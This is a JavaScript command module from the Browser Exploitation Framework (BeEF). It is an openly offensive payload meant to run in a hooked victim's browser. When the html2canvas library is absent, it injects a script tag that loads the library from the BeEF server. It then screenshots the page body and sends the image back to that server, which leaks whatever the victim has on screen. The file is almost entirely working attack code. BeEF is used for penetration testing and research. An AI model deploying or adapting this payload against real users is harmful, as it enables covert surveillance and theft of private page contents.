//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	takeit = function() {
		try {
			html2canvas(document.body).then(function(canvas) {
	    		var d = canvas.toDataURL('image/png');
	    		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'image=' + d );
	    		ret = true;
	    		alert('Did it.');
	    	});
	    }
	    catch (e) {
	    	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Obtaining snapshot failed: ' + e.message);
	    	alert('FAILED.');
	    }
	};

	if (typeof html2canvas == "undefined") {		
		var script = document.createElement('script');
		script.type = 'text/javascript';
		script.src = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/h2c.js';
		$j("body").append(script);

	    setTimeout(takeit, 400);
	}
	else {
		takeit();
	}
});
